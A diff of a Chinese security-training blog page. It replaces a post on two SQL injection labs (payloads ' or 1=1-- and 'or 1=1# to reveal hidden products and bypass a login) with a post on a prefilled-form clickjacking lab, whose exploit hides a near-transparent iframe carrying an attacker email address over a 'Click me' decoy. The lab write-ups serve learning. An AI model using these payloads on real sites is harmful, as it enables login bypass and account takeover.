@@ -46,22 +46,21 @@
   };
 </script>
 
-  <meta name="description" content="安全实验室的SQL实验1主要为了看隐藏信息1.简单的SQL注入 URL中结尾是？xxx&#x3D;xxxx  对于这种情况就是在 结尾 + or语句试试看  实验室要求是  显示所有的产品(包括那些隐藏的产品)  解题思路就是 ’  结尾，结束网址，然后输入or 1&#x3D;1—搜索全部的 安全实验室的SQL实验2逻辑上漏洞的绕过这个逻辑漏洞是  因为登录框采用的是mysql 的       我们用select *">
-<meta name="keywords" content="sql注入,web安全">
+  <meta name="description" content="和UI劫持一的实验相比  就是多一个表单  然后我们提前在里面输入电子邮件，然后可以多一个点击点  ，进行操作 UI劫持2成功  UI劫持2目标  实验室  渗透利用代码 1&amp;lt;style&amp;gt;2   iframe &amp;#123;3       position:relative;4       width:700px;5       height: 500px;6       opacity">
+<meta name="keywords" content="渗透,UI劫持">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;05&#x2F;SQL%E6%B3%A8%E5%85%A5&#x2F;index.html">
+<meta property="og:title" content="预先填写的表单输入劫持">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;08&#x2F;%E9%A2%84%E5%85%88%E5%A1%AB%E5%86%99%E7%9A%84%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E5%8A%AB%E6%8C%81&#x2F;index.html">
 <meta property="og:site_name" content="Dallosc">
-<meta property="og:description" content="安全实验室的SQL实验1主要为了看隐藏信息1.简单的SQL注入 URL中结尾是？xxx&#x3D;xxxx  对于这种情况就是在 结尾 + or语句试试看  实验室要求是  显示所有的产品(包括那些隐藏的产品)  解题思路就是 ’  结尾，结束网址，然后输入or 1&#x3D;1—搜索全部的 安全实验室的SQL实验2逻辑上漏洞的绕过这个逻辑漏洞是  因为登录框采用的是mysql 的       我们用select *">
+<meta property="og:description" content="和UI劫持一的实验相比  就是多一个表单  然后我们提前在里面输入电子邮件，然后可以多一个点击点  ，进行操作 UI劫持2成功  UI劫持2目标  实验室  渗透利用代码 1&amp;lt;style&amp;gt;2   iframe &amp;#123;3       position:relative;4       width:700px;5       height: 500px;6       opacity">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;sql注入实验室第一个.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;安全实验室的SQL实验2.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;zhenx.png">
-<meta property="og:updated_time" content="2019-12-05T05:22:53.327Z">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;UI劫持2成功.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;UI劫持2目标.png">
+<meta property="og:updated_time" content="2019-12-08T09:30:35.826Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;sql注入实验室第一个.png">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;q20wi1s2d.bkt.clouddn.com&#x2F;UI劫持2成功.png">
 
-<link rel="canonical" href="http://yoursite.com/2019/12/05/SQL%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="http://yoursite.com/2019/12/08/%E9%A2%84%E5%85%88%E5%A1%AB%E5%86%99%E7%9A%84%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E5%8A%AB%E6%8C%81/">
 
 
 <script id="page-configurations">
@@ -75,7 +74,7 @@
   };
 </script>
 
-  <title>SQL注入 | Dallosc</title>
+  <title>预先填写的表单输入劫持 | Dallosc</title>
   
 
 
@@ -214,7 +213,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/05/SQL%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/08/%E9%A2%84%E5%85%88%E5%A1%AB%E5%86%99%E7%9A%84%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E5%8A%AB%E6%8C%81/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -227,7 +226,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SQL注入
+          预先填写的表单输入劫持
         </h1>
 
         <div class="post-meta">
@@ -238,7 +237,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2019-12-05 12:31:27 / 修改时间：13:22:53" itemprop="dateCreated datePublished" datetime="2019-12-05T12:31:27+08:00">2019-12-05</time>
+              <time title="创建时间：2019-12-08 17:10:40 / 修改时间：17:30:35" itemprop="dateCreated datePublished" datetime="2019-12-08T17:10:40+08:00">2019-12-08</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -248,12 +247,6 @@
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
                     <span itemprop="name">渗透</span>
-                  </a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/%E7%9D%A1%E8%A7%89/" itemprop="url" rel="index">
-                    <span itemprop="name">睡觉</span>
                   </a>
                 </span>
             </span>
@@ -269,9 +262,13 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="安全实验室的SQL实验1"><a href="#安全实验室的SQL实验1" class="headerlink" title="安全实验室的SQL实验1"></a>安全实验室的SQL实验1</h3><p>主要为了看隐藏信息<br>1.简单的SQL注入 URL中结尾是？xxx=xxxx<br>  对于这种情况就是在 结尾 + or语句试试看<br>  实验室要求是  显示所有的产品(包括那些隐藏的产品)<br>  解题思路就是 ’  结尾，结束网址，然后输入or 1=1—搜索全部的<br><img src="http://q20wi1s2d.bkt.clouddn.com/sql注入实验室第一个.png" alt="sql注入实验室第一个"></p>
-<h3 id="安全实验室的SQL实验2"><a href="#安全实验室的SQL实验2" class="headerlink" title="安全实验室的SQL实验2"></a>安全实验室的SQL实验2</h3><p>逻辑上漏洞的绕过<br>这个逻辑漏洞是  因为登录框采用的是mysql 的       我们用<br>select * from users where username = ‘(你在账号那里填的东西)       ‘   and  password = ‘(你在密码填的东西)   ‘<br>我用的方法是  账号那里填 ‘or 1=1#<br>因为’OR 1=1  说明了这是一个真命题  可以执行    #后面就是注释  写什么都没有关系了<br><img src="http://q20wi1s2d.bkt.clouddn.com/安全实验室的SQL实验2.png" alt="安全实验室的SQL实验2"><br><img src="http://q20wi1s2d.bkt.clouddn.com/zhenx.png" alt="www"></p>
-
+        <p>和UI劫持一的实验相比  就是多一个表单  然后我们提前在里面输入电子邮件，然后可以多一个点击点  ，进行操作</p>
+<p>UI劫持2成功</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持2成功.png" alt="UI劫持2成功"></p>
+<p>UI劫持2目标</p>
+<p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持2目标.png" alt="UI劫持2目标"></p>
+<p>实验室  渗透利用代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">   iframe &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">       position:relative;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">       width:700px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">       height: 500px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">       opacity: 0.0001;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">       z-index: 2;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">   div &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">       position:absolute;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">       top:420px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">       left:80px;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">       z-index: 1;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;style&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">&lt;div&gt;Click me&lt;&#x2F;div&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;ac651fa21ef1d5a88006bb7000280040.web-security-academy.net&#x2F;email?email&#x3D;hacker@attacker-website.com&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure>
     </div>
 
     
@@ -280,8 +277,8 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
-              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/UI%E5%8A%AB%E6%8C%81/" rel="tag"># UI劫持</a>
           </div>
 
         
@@ -290,12 +287,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/12/04/CORS/" rel="prev" title="CORS">
-      <i class="fa fa-chevron-left"></i> CORS
+    <a href="/2019/12/07/WebSockets%E5%AE%9E%E9%AA%8C%E5%AE%A41/" rel="prev" title="WebSockets实验室1">
+      <i class="fa fa-chevron-left"></i> WebSockets实验室1
     </a></div>
       <div class="post-nav-item">
-    <a href="/2019/12/06/FuzzScanner%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="next" title="FuzzScanner的使用">
-      FuzzScanner的使用 <i class="fa fa-chevron-right"></i>
+    <a href="/2019/12/08/%E4%BD%BF%E7%94%A8%E6%A1%86%E6%9E%B6%E7%A0%B4%E5%9D%8F%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/" rel="next" title="使用框架破坏脚本进行点击劫持">
+      使用框架破坏脚本进行点击劫持 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -334,7 +331,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#安全实验室的SQL实验1"><span class="nav-number">1.</span> <span class="nav-text">安全实验室的SQL实验1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安全实验室的SQL实验2"><span class="nav-number">2.</span> <span class="nav-text">安全实验室的SQL实验2</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
